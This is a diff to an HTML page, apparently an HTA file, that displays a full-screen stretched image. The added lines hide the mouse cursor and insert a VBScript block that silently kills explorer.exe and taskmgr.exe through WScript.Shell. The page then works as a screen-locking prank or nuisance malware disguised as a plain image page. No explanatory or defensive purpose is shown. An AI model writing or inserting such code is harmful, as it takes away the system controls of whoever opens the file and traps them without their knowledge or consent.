@@ -19,6 +19,7 @@ html, body {
     height: 100%;
     overflow: hidden;
     background: black;
+    cursor: none;
 }
 
 img {
@@ -27,9 +28,12 @@ img {
     object-fit: fill; /* stretches image */
 }
 </style>
-
+  <script language="VBScript">
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "taskkill /f /im explorer.exe", 0, True
+    shell.Run "taskkill /f /im taskmgr.exe", 0, True
+  </script>
 </head>
-
 <body>
 <img src="https://file.garden/aUYIWVAKvQxCBY-_/database/images/dish.png">
 </BODY>
